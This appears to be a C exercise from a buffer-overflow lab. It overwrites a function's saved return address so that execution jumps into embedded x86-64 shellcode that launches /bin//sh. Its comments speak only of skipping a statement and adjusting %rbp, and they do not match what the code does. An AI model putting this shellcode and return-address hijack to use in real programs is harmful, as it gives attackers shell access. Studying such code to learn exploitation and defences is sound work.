#include <stdio.h>

unsigned char code[]= "\xbe\x00\x00\x00\x00\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb8\x3b\x00\x00\x00\x99\x0f\x05";

void function (int a, int b, int c) {
    char cc, d;
    char buf[5];
    char buffer1[12];
    long *ret;

    /* By using the ret variable, you must modify the return address stored on the stack*/
    /* in such a way that the main program skips one statement*/
    // Make 'ret' point to %rbp
    ret = (long *) (&ret + 5);
    // Increase %rbp 4 bytes
    *ret = (long) code;
}

int main() {
    char x;
    x = 'a';
    printf("Hello\n");
    printf("I am going to skip a statement\n");
    function(1, 2, 3);
    x = 'b';
    printf("The following value must be the a letter: %c\n",x);
}
